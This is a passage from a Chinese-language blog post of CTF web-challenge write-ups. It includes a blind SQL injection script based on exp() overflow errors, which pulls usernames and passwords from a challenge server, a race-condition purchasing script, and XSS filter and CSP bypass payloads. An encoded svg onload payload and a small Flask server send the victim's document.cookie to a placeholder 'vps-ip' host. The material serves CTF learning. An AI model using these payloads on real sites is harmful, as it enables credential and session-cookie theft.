class="line">def thread_main(count):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count*2):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"solve"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(count):</span><br><span class="line">        t = threading.Thread(target=action, args=(<span class="string">"buy"</span>,))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    thread_main(250)</span><br></pre></td></tr></table></figure></p>
+<h2 id="Cosmos的留⾔板-2"><a href="#Cosmos的留⾔板-2" class="headerlink" title="Cosmos的留⾔板-2"></a>Cosmos的留⾔板-2</h2><p>这道题很奇怪，注入点在delete_id，也不知道过滤了什么东西233，测试不出来<br>注入姿势第一次见，直接上师傅的脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_mod = <span class="string">"http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=exp((select/**/case/**/when(&#123;0&#125;)then(99999)else(1)end))"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=s5kb5k11rm0lndtmgmib0vhg92"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(table_name)from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># payload_mod = "ord(substr((select/**/group_concat(column_name)from/**/information_schema.columns/**/where/**/table_name='user'),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">payload_mod = <span class="string">"ord(substr((select/**/group_concat(name,0x7e,password)from/**/user),&#123;0&#125;,1))&gt;&#123;1&#125;"</span></span><br><span class="line"><span class="comment"># cosmos~f1FXOCnj26Fkadzt4Sqynf6O7CgR</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = 1</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    l_bound = 0; u_bound = 255</span><br><span class="line">    <span class="keyword">while</span> l_bound &lt;= u_bound:</span><br><span class="line">        m_bound = (l_bound + u_bound) //2</span><br><span class="line">        payload = payload_mod.format(index, m_bound)</span><br><span class="line">        url = url_mod.format(payload)</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        </span><br><span class="line">        res = requests.get(url, headers=headers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"失败"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            l_bound = m_bound + 1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp = m_bound</span><br><span class="line">            u_bound = m_bound - 1</span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += 1</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></p>
+<p>exp函数有一个特点，当参数大于709时会引起一个溢出错误<br><img src="https://uploader.shimo.im/f/YCubfCYeF1IWAkdx.png!thumbnail" alt><br>然后就是select case when then else end 语句<br><img src="https://uploader.shimo.im/f/RFziU38fadI1MsGI.png!thumbnail" alt><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp报错注入，本地测有点问题，不确定能不能用</span><br><span class="line">mysql&gt; select exp(~(select*from(select user())x));  </span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>root@localhost<span class="string">' from dual)))'</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h2><p>复制的官方wp233,仅作学习姿势<br>替换了 script 为<br>空，双写可以绕过。<br>但是发现输⼊<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scripscriptt&gt;alert(1)&lt;/scripscriptt&gt;</span><br></pre></td></tr></table></figure></p>
+<p>之后并没有如愿弹框，⽽且控制台出现了：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Refused to execute inline script because it violates the following Content</span><br><span class="line">Security Policy directive: <span class="string">"script-src 'self'"</span>. Either the <span class="string">'unsafe-inline'</span></span><br><span class="line">keyword, a <span class="built_in">hash</span> (<span class="string">'sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='</span>), or a</span><br><span class="line">nonce (<span class="string">'nonce-...'</span>) is required to <span class="built_in">enable</span> inline execution.</span><br></pre></td></tr></table></figure></p>
+<p>说明输⼊被 CSP(Content Security Policy) 拦了，从返回头中可以看到本题的 CSP 策略为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src <span class="string">'self'</span>; script-src <span class="string">'self'</span></span><br></pre></td></tr></table></figure></p>
+<p>它限制了内联 JS 脚本，并且限制了引⼊的静态资源⽂件只能从同域下加载。在实际应⽤中，遇到这种<br>CSP ⼀般是找该站是否有⽂件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引⽤，也可以同源下有<br>没有可以执⾏任意 JS 代码的 evil.js ⽂件。<br>本题中有⼀个接⼝ /send ，它会返回过滤后的消息内容，我们可以利⽤这个接⼝，在⼀次 send 中再引<br>⼊⼀次 send，向它传⼊参数，将它作为 JS ⽂件引⼊，即<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src=<span class="string">"/send?message=alert(1)"</span>&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h2><p>因为对xss了解甚少，记录一下week2的xss,完全复制的官方wp233<br>留⾔板过滤了所有闭合的html标签，即进⾏了⼀次 re.sub(“&lt;/?[^&gt;]+&gt;”, “”, message) 这样的替换<br>之后过滤了script、iframe，并且消息全部转化为⼤写 可以选择⽤浏览器事件执⾏js，不闭合右标签，<br>浏览器会起到⾃动补全的作⽤，最后加注释，注释掉后⾯拼过来的&lt;\/span&gt; ， ⼤写可以使⽤编码绕<br>过，然后只要找个vps或者外带数据的平台接收cookie就可以了<br>jsfuck来绕⼤写，后台bot⽤的selenium只⽀持get请求，jsfuck转换出来上万字符的payload就传不过去<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;<span class="comment">#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span></span><br><span class="line">&amp;<span class="comment">#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;</span></span><br><span class="line"><span class="comment">#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47</span></span><br><span class="line">编码内的内容是 window.open(<span class="string">'http://vps-ip'</span>+document.cookie);//</span><br></pre></td></tr></table></figure></p>
+<p>这题也可以选择引⼊外部⻚⾯，使⽤link标签可以引⼊⻚⾯，payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=<span class="string">"import"</span> href=<span class="string">"http://vps-ip/"</span></span><br></pre></td></tr></table></figure></p>
+<p>这个做法仅限chrome，因为bot也是chrome，所以也可以选择这种做法 但是由于跨域问题，浏览器会拦截<br>跨域问题需要vps上的后端或服务器处理，⽐较⽅便的，可以python起⼀个⻚⾯，添加⼀个头<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br></pre></td></tr></table></figure></p>
+<p>就可以引⼊外部，拿到cookie<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from flask import *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def hello_world():</span><br><span class="line"> response = make_response(<span class="string">"&lt;script&gt;window.open('http://vpsip/'+document.cookie)&lt;/script&gt;"</span>)</span><br><span class="line"> response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br><span class="line"> <span class="built_in">return</span> response</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> app.run(host=<span class="string">"0.0.0.0"</span>,port=80)</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/22/CISCN2019/" rel="next" title="CISCN2019">
+                <i class="fa fa-chevron-left"></i> CISCN2019
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/08/CISCN2019-2/" rel="prev" title="CISCN2019">
+                CISCN2019 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cop</p>
+              <p class="site-description motion-element" itemprop="description">cop's blog</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#序列之争-Ordinal-Scale"><span class="nav-number">1.</span> <span class="nav-text">序列之争 - Ordinal Scale</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二发入魂"><span class="nav-number">2.</span> <span class="nav-text">二发入魂!</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的二手市场"><span class="nav-number">3.</span> <span class="nav-text">Cosmos的二手市场</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的留⾔板-2"><span class="nav-number">4.</span> <span class="nav-text">Cosmos的留⾔板-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的聊天室2-0"><span class="nav-number">5.</span> <span class="nav-text">Cosmos的聊天室2.0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cosmos的聊天室"><span class="nav-number">6.</span> <span class="nav-text">Cosmos的聊天室</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cop</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true}});</script></body>
+</html>
